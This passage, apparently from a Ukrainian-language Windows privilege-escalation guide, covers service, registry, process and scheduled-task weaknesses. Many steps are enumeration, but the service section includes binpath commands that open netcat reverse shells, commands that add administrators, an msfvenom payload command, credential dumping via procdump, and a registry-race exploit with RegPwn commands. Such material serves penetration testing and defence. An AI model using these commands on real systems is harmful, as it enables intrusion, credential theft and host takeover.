Перегляньте цю сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати їхніми можливостями:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійшли користувачі / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Насамперед, переглядаючи список процесів, **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися можливими [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): їх можна використати для підвищення привілеїв.

Слухач debugger може працювати недовго, тому його відсутність у знімку пасивного сканування портів не доводить, що він ніколи не був доступний. Якщо виявили слухач, зіставте його PID, власника процесу та можливість доступу до нього користувача з нижчими привілеями; сама назва застосунку чи прапорець налагодження не доводять можливість виконання коду від імені іншого користувача. Під час звичайного збору даних обмежуйтеся пасивним переліком і не надсилайте команди debugger.

**Перевірка дозволів для бінарних файлів процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів на папки з виконуваними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги dynamic preprocessor Snort

Snort 2 може завантажувати shared libraries з `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Для scheduled task або service, що запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів. Якщо ваш token може створювати там файли, цей шлях варто перевірити на можливість code execution під час наступного завантаження модулів цим завданням або службою. Перевірте ефективні привілеї облікового запису, від імені якого запускається процес, активну конфігурацію, сумісність модулів і будь-які обмеження deny або share; сам факт доступу на запис до каталогу не доводить можливість підвищення привілеїв. У [документації Snort щодо dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з доступним для запису кореневим каталогом документів

В інсталяції Apache на Windows порівняйте шлях до виконуваного файлу служби та обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової інсталяції XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, server-side code execution може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, що обслуговуються файли саме з цього шляху та що обробник на сервері обробляє цей тип файлів; сам доступ на запис до кореневого каталогу підтверджує лише можливість створювати файли. Перевірте ACL, не записуючи probe:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для звичайного встановлення WAMP служба може вказувати на версійний `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація поруч із ним зберігатися в `conf\httpd.conf`, а кореневим каталогом за замовчуванням бути `C:\wamp64\www` або `C:\wamp\www`. Перевірте разом точний шлях до виконуваного файла служби, обліковий запис, від імені якого вона запускається, ефективний `DocumentRoot` (зокрема підстановку `${INSTALL_DIR}` і перевизначення virtual host) і ACL кореневого каталогу. Доступ на запис до каталогу WAMP не доводить, що Apache працює від `SYSTEM` або виконує надісланий файл. [В документації Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте доступний для запису фізичний каталог з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і обробник на сервері. Код у каталозі, що обслуговується, виконується від імені пулу лише тоді, коли IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати доступний для запису каталог можливістю виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET — це окремий шлях, який варто перевірити: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft описує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен користувача з нижчими привілеями дає змогу змінювати згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи перекомпілює застосунок його від імені більш привілейованої [ідентичності робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файла або каталогу не доводять можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом будь-якої повторної компіляції. Перевіряйте метадані лише для читання; під час переліку не запускайте компіляцію й не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера хоста**, навіть якщо його локальний токен має низькі привілеї. `LocalSystem` уже має високі локальні привілеї й також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай використовує анонімні облікові дані мережі. Натомість пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть застосовуватися типові налаштування пулу, які різняться між поколіннями IIS, тому з’ясуйте ефективну конфігурацію, а не робіть припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права **саме цього комп’ютера** в домені. Для [DCSync](../active-directory-methodology/dcsync.md) потрібні права реплікації в контексті іменування домену; сам квиток облікового запису комп’ютера або роль хоста цього не доводять. Пасивний перелік має перевіряти конфігурацію й ACL, не завантажуючи файли, не виконуючи мережеву автентифікацію та не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення з запиту через автентифікацію, розшифрування, перевірку та формування команди. Обробник, що об’єднує декодований токен із `ProcessStartInfo("cmd", "/c ...")`, може дозволити shell-метасимволам змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що недовірений викликач справді може впливати на декодоване значення та звертатися до обробника, а потім з’ясуйте ефективну ідентичність пулу застосунків або імперсонованого користувача й ідентичність дочірнього процесу. Рядок коду, доступний для читання, локальний слухач або слабкість формату токена самі по собі не доводять можливість виконання команд із підвищеними привілеями. Перевіряйте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного переліку.

Для служби PHP у Windows шлях, контрольований запитом і переданий до [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файла, доступного для запису користувачу з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінити, а робочий процес — прочитати, що застосовні обмеження шляхів PHP дозволяють включення та що робочий процес справді має вищі привілеї. Самі по собі локальний слухач або доступний для запису файл не доводять наявність цього ланцюжка; під час пасивного переліку перевіряйте вихідний код, ідентичність служби й ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із Sysinternals можна створити дамп пам’яті запущеного процесу. Такі служби, як FTP, зберігають **облікові дані у відкритому тексті в пам’яті**; спробуйте зняти дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Незахищені GUI-застосунки

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу відкрити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1): знайдіть «командний рядок» і натисніть «Натисніть, щоб відкрити командний рядок».

### Імпорт файлів проєкту з підвищеними привілеями

Застосунок, який автоматично відкриває проєкти з каталогу для скидання, доступного для запису користувачам із нижчими привілеями, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях із правами на запис**, процес або завдання, що відкриває його, ефективну ідентичність і збірку парсера. [Історична проблема Ghidra з відкриттям/відновленням проєкту](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяють [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це привід перевірити ризик розкриття облікових даних, а не спосіб негайно отримати доступ адміністратора: отриману відповідь має бути можливо використати через окремий авторизований або вразливий шлях, а актуальні збірки потрібно оцінювати з урахуванням фактичного стану виправлень. Не відкривайте спеціально створений проєкт під час пасивної розвідки; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) на об’єкт Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний доступ лише для читання через [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із запитом цього права — привід для перевірки, а не доказ того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися помилкою, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого встановлення служби зіставте ці права SCM із мережевим ресурсом на цільовому вузлі, до якого **той самий мережевий вхід** має доступ на запис, базовими ACL NTFS і локальним шляхом до виконуваного файла, який може запустити обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо є незвично широкі права SCM і шлях для розміщення файла; адміністративний мережевий ресурс не є обов’язковою умовою. Сам по собі доступ на запис до мережевого ресурсу або можливість створення служби через SCM не доводить, що нову службу вдасться запустити з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, завершення роботи або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла розв’язується в каталог, доступний для запису користувачу з нижчими привілеями, а служба працює з вищими привілеями, відсутній файл може бути кандидатом на заміну — за певних умов. Підтвердьте **фактичний код служби або задокументований виклик допоміжного файла**, визначений шлях до виконуваного файла й порядок пошуку, права на створення каталогів, ідентичність служби та наявність доступного тригера життєвого циклу. Самі лише доступний для запису каталог служби або відсутній файл не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо вона використовує вибраний викликачем аргумент як шлях до журналу або файла експорту, перевірте ідентичність служби, точний шлях від аргументу до запису, обмеження шляхів і дозволи для **створеного файла**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого лише доступного для запису журналу або права запуску недостатньо. Під час пасивного інвентаризаційного огляду не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, є **приводом перевірити конфігурацію**: у ньому можуть зберігатися облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, вебслухач і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), фактичне право реєструвати чи змінювати команду та тригер, який запускає її від імені служби. Слухач, доступний лише через loopback, усе одно може бути досяжним локальному користувачу, але самі лише шлях до файла, пароль або слухач не підтверджують наявність таких прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секретів і не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу й скриптів](https://nsclient.org/docs/setup/securing/) і [налаштування зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби й значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає дочірній застосунок саме там](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, яку відкриває цей дочірній процес, — окремий привід для перевірки: з’ясуйте, чи доступна вона користувачу з нижчими привілеями, чи приймає конкретна операція його вхідні дані та чи виконує дочірній процес служби небезпечну операцію з вищими привілеями. Самі лише обліковий запис служби, URL кінцевої точки або доступний для запису шлях не доводять можливість підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для власної операції WCF простежте, чи потрапляє контрольований викликачем рядок у runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними Windows для транспортного рівня](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але дозвіл викликати **конкретну** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних викликачa з нижчими привілеями до `AddScript` у контексті служби з вищими привілеями є межею виконання коду; самі лише порт, клієнт, який пройшов автентифікацію, або невикористовуваний метод у сторонній збірці нічого не доводять. Під час розвідки статично перевірте розгорнуту службу, контракт, авторизацію та параметри імперсонації, не викликаючи кінцеву точку.

Тригери служб дозволяють Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, під’єднання пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, спрацьовуючи на їхні тригери. Методи перевірки та активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — службу діагностики, налаштовану для роботи від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) використовували junction і гонку з посиланням диспетчера об’єктів, щоб перенаправити скидання DACL служби. Для продемонстрованого підвищення привілеїв також потрібен був доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної перевірки тріажу перегляньте обліковий запис і шлях до бінарного файла цієї служби, перевірте наявність шляху до компілятора Setup WMI та стан виправлень установленого компонента. Самі лише запис служби, версія продукту Visual Studio або файл компілятора не доводять, що вузол вразливий. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не можна запустити, оскільки її вимкнено або з нею не пов’язано жодних увімкнених пристроїв._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Враховуйте, що для роботи служби upnphost потрібна служба SSDPSRV (для XP SP1)**

**Ще один спосіб обійти** цю проблему — запустити:

```
sc.exe config usosvc start= auto
```

### **Змінення шляху до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має право **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапустити службу

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити завдяки різним дозволам:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дає змогу змінювати дозволи, що дозволяє змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Також дає змогу змінювати конфігурацію служби.
- **GENERIC_ALL**: Також дає змогу змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого облікового запису домену, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозволи на запис у папку**, де розташовано цей бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
За допомогою **wmic** (не в system32) можна отримати перелік усіх бінарних файлів, які запускають служби, а дозволи перевірити за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо права **`(F)`**, **`(M)`** або **`(W)`** на виконуваний файл служби чи каталог, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Перевірте, чи можна записувати до бінарного файлу, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні засоби автоматизованої перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапускати її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на зміну реєстру служб

Слід перевірити, чи можете ви змінювати будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби так:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** права на запис у розділі реєстру певної служби. Сам запис ACL не доводить наявність ефективного доступу: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для ескалації також потрібне доступне для зміни поле конфігурації служби, спосіб запустити службу та обліковий запис служби з вищими привілеями. Див. довідку Microsoft про [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [права доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до виконуваного бінарного файла:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка символічного посилання в реєстрі для запису довільного значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** у ключ сеансу HKLM. **Гонка символічного посилання** в реєстрі може перенаправити цей привілейований запис у **будь-який шлях HKLM**, надаючи примітив для **запису довільного значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список встановлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого столу, і користувач має право запису до нього.

Послідовність експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має записати SYSTEM.
2. Запустіть копіювання для захищеного робочого столу (наприклад, **LockWorkstation**), що ініціює процес AT broker.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий ключ HKLM.
4. SYSTEM запише вибране зловмисником значення за перенаправленим шляхом HKLM.

Отримавши можливість записувати довільні значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запустити звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація експлойту **блокує робочу станцію** як частину гонки.

Приклад інструментів (RegPwn BOF / автономний варіант):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код**:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи служб без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб без лапок, за винятком тих, що належать до вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити й експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які потрібно виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей файл можна замінити, можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для увімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований пакетний файл містить буквальний виклик PowerShell `-File`, також перевірте ACL указаного скрипту; змінні, умовні оператори та ланцюжки команд потрібно відстежувати вручну. Скрипт або батьківський каталог, доступний для запису викликачеві, є підказкою щодо виконання коду з облікового запису іншого користувача лише тоді, коли налаштований принципал завдання відрізняється від викликачa, а завдання справді доходить до цієї дії. ACL лише з правом дописування може мати значення для скриптів, але попередній `exit` або інша логіка керування потоком можуть зробити дописані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування програмами. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

